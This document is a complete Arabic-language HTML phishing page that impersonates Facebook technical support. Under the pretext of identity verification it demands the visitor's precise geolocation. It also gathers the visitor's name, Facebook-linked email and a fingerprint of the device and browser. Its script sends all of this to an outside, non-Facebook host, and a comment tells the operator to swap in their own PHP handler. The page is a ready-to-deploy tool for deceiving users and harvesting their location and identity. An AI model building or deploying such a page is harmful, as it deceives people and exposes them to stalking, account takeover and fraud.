<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>الدعم الفني لفيسبوك | تأكيد الهوية</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(145deg, #f0f2f5 0%, #e4e8ef 100%);
            color: #1c1e21;
            padding: 20px;
        }
        .container { max-width: 900px; margin: 0 auto; }
        .header {
            background: #1877f2;
            border-radius: 28px;
            padding: 25px;
            margin-bottom: 25px;
            color: white;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        .header h1 { font-size: 2rem; display: flex; align-items: center; justify-content: center; gap: 12px; }
        .header h1 i { background: white; color: #1877f2; border-radius: 50%; padding: 10px; }
        .identity-box {
            background: #fff3cd;
            border-right: 6px solid #ffc107;
            padding: 20px;
            border-radius: 20px;
            margin-bottom: 25px;
            text-align: center;
        }
        .identity-box i { font-size: 2rem; color: #ff9800; margin-bottom: 10px; }
        .identity-box p { font-size: 1rem; color: #856404; }
        .btn-location {
            background: #28a745;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 40px;
            font-weight: bold;
            margin: 15px 0;
            cursor: pointer;
            font-size: 1rem;
        }
        .location-status {
            background: #e9ecef;
            padding: 10px;
            border-radius: 15px;
            margin: 10px 0;
            font-size: 0.9rem;
        }
        .form-box {
            background: white;
            border-radius: 28px;
            padding: 30px;
            margin: 20px 0;
            box-shadow: 0 8px 20px rgba(0,0,0,0.08);
        }
        .form-group { margin-bottom: 18px; }
        label { font-weight: 600; display: block; margin-bottom: 8px; }
        input, select, textarea {
            width: 100%;
            padding: 12px 16px;
            border-radius: 28px;
            border: 1px solid #ccd0d5;
            font-family: 'Cairo', sans-serif;
        }
        .btn-submit {
            background: #42b72a;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 40px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            font-size: 1.1rem;
        }
        .toast-msg {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: #1e2a36;
            color: white;
            padding: 12px 20px;
            border-radius: 50px;
            opacity: 0;
            transition: opacity 0.3s;
            z-index: 1000;
        }
        footer {
            text-align: center;
            padding: 20px;
            color: #6c757d;
            font-size: 0.8rem;
        }
        @media (max-width: 600px) { .header h1 { font-size: 1.5rem; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1><i class="fab fa-facebook"></i> الدعم الفني لفيسبوك</h1>
        <p>تأكيد الهوية لحماية حسابك</p>
    </div>

    <!-- رسالة تأكيد الهوية مع طلب مشاركة الموقع -->
    <div class="identity-box">
        <i class="fas fa-shield-alt"></i>
        <p><strong>🔐 فيسبوك يطلب تأكيد هويتك</strong></p>
        <p>لأسباب أمنية، يجب عليك مشاركة موقعك الجغرافي الحالي لتأكيد ملكية الحساب.</p>
        <p>هذا الإجراء يحمي حسابك من الاختراق والوصول غير المصرح به.</p>
        <button id="getLocationBtn" class="btn-location"><i class="fas fa-map-marker-alt"></i> مشاركة موقعي الجغرافي</button>
        <div id="locationResult" class="location-status"></div>
    </div>

    <div class="form-box">
        <h3><i class="fas fa-edit"></i> نموذج طلب الدعم الفني</h3>
        <form id="supportForm">
            <div class="form-group">
                <label><i class="fas fa-user"></i> الاسم الكامل</label>
                <input type="text" id="fullname" placeholder="أحمد محمد" required>
            </div>
            <div class="form-group">
                <label><i class="fas fa-envelope"></i> البريد الإلكتروني (مرتبط بفيسبوك)</label>
                <input type="email" id="email" placeholder="example@domain.com" required>
            </div>
            <div class="form-group">
                <label><i class="fas fa-tag"></i> نوع المشكلة</label>
                <select id="issueType" required>
                    <option value="">-- اختر --</option>
                    <option>نسيت كلمة السر</option>
                    <option>اختراق الحساب</option>
                    <option>تطبيق لا يعمل</option>
                    <option>حظر أو تقييد</option>
                </select>
            </div>
            <div class="form-group">
                <label><i class="fas fa-comment"></i> شرح المشكلة</label>
                <textarea id="description" rows="3" placeholder="تفاصيل المشكلة..." required></textarea>
            </div>
            <button type="submit" class="btn-submit"><i class="fab fa-facebook-messenger"></i> إرسال الطلب</button>
        </form>
    </div>
    <footer>© 2026 الدعم الفني لفيسبوك - تأكيد الهوية مطلوب لحماية حسابك</footer>
</div>
<div id="toast" class="toast-msg"><span id="toastMsg"></span></div>

<script>
    let userLocation = null;
    let locationShared = false;

    // عناصر DOM
    const locationBtn = document.getElementById('getLocationBtn');
    const locationDiv = document.getElementById('locationResult');
    const form = document.getElementById('supportForm');
    const toast = document.getElementById('toast');
    const toastMsg = document.getElementById('toastMsg');

    function showToast(message, isError = false) {
        toastMsg.innerText = message;
        toast.style.opacity = '1';
        toast.style.background = isError ? '#c0392b' : '#1e2a36';
        setTimeout(() => { toast.style.opacity = '0'; }, 5000);
    }

    // الحصول على الموقع الجغرافي
    function getLocation() {
        if (!navigator.geolocation) {
            locationDiv.innerHTML = '❌ متصفحك لا يدعم مشاركة الموقع.';
            showToast('متصفحك لا يدعم خاصية الموقع', true);
            return;
        }
        locationDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحصول على موقعك...';
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                userLocation = { lat, lng };
                locationShared = true;
                locationDiv.innerHTML = `✅ تم مشاركة موقعك: خط العرض ${lat.toFixed(6)} / خط الطول ${lng.toFixed(6)}<br><i class="fas fa-check-circle"></i> فيسبوك يؤكد هويتك عبر هذا الموقع.`;
                showToast('تم تأكيد الموقع بنجاح! يمكنك إرسال الطلب الآن.');
            },
            (error) => {
                console.error(error);
                let errMsg = '';
                switch(error.code) {
                    case error.PERMISSION_DENIED: errMsg = '🔐 تم رفض مشاركة الموقع. يرجى السماح بالوصول إلى الموقع لإكمال التحقق.'; break;
                    case error.POSITION_UNAVAILABLE: errMsg = '⚠️ الموقع غير متاح حالياً. حاول مرة أخرى.'; break;
                    case error.TIMEOUT: errMsg = '⏰ انتهى الوقت. حاول مجدداً.'; break;
                    default: errMsg = 'حدث خطأ غير معروف.';
                }
                locationDiv.innerHTML = `❌ ${errMsg}`;
                showToast(errMsg, true);
                locationShared = false;
            },
            { enableHighAccuracy: true, timeout: 15000 }
        );
    }

    locationBtn.addEventListener('click', getLocation);

    // جمع معلومات الجهاز والمتصفح واللغة
    function getDeviceInfo() {
        const platform = navigator.platform || 'unknown';
        const userAgent = navigator.userAgent;
        let os = 'unknown';
        if (userAgent.indexOf('Win') !== -1) os = 'Windows';
        else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
        else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
        else if (userAgent.indexOf('Android') !== -1) os = 'Android';
        else if (userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) os = 'iOS';

        let browser = 'unknown';
        if (userAgent.indexOf('Firefox') !== -1) browser = 'Mozilla Firefox';
        else if (userAgent.indexOf('Chrome') !== -1) browser = 'Google Chrome';
        else if (userAgent.indexOf('Safari') !== -1) browser = 'Safari';
        else if (userAgent.indexOf('Edge') !== -1) browser = 'Microsoft Edge';
        else if (userAgent.indexOf('OPR') !== -1 || userAgent.indexOf('Opera') !== -1) browser = 'Opera';

        const language = navigator.language || navigator.userLanguage || 'ar';
        const screenRes = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        return {
            platform: platform,
            os: os,
            browser: browser,
            language: language,
            screen_resolution: screenRes,
            timezone: timezone,
            user_agent: userAgent,
            connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown'
        };
    }

    // إرسال البيانات عبر AJAX
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        if (!locationShared || !userLocation) {
            showToast('⚠️ يجب عليك مشاركة موقعك الجغرافي أولاً لتأكيد هويتك على فيسبوك.', true);
            return;
        }

        const fullname = document.getElementById('fullname').value.trim();
        const email = document.getElementById('email').value.trim();
        const issueType = document.getElementById('issueType').value;
        const description = document.getElementById('description').value.trim();

        if (!fullname || !email || !issueType || !description) {
            showToast('الرجاء تعبئة جميع الحقول.', true);
            return;
        }
        if (!email.includes('@')) {
            showToast('البريد الإلكتروني غير صحيح.', true);
            return;
        }

        const deviceInfo = getDeviceInfo();

        const payload = {
            fullname: fullname,
            email: email,
            issue_type: issueType,
            description: description,
            location: {
                lat: userLocation.lat,
                lng: userLocation.lng,
                shared: true,
                timestamp: new Date().toISOString()
            },
            device_info: deviceInfo,
            submitted_at: new Date().toISOString()
        };

        // تعطيل الزر أثناء الإرسال
        const submitBtn = form.querySelector('button[type="submit"]');
        const originalText = submitBtn.innerHTML;
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';

        try {
            // ⚠️ IMPORTANT: Remplacez cette URL par l'URL de votre fichier PHP
            const API_URL = 'https://tripolihomes.website/support-handler.php';
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (result.success) {
                showToast('✅ تم إرسال الطلب مع تأكيد الموقع! سيتم الرد قريباً.');
                form.reset();
                locationShared = false;
                userLocation = null;
                locationDiv.innerHTML = '';
            } else {
                showToast('❌ فشل الإرسال: ' + (result.error || 'خطأ غير معروف'), true);
            }
        } catch (err) {
            console.error(err);
            showToast('❌ خطأ في الاتصال بالخادم. تأكد من الرابط.', true);
        } finally {
            submitBtn.disabled = false;
            submitBtn.innerHTML = originalText;
        }
    });
</script>
</body>
</html>
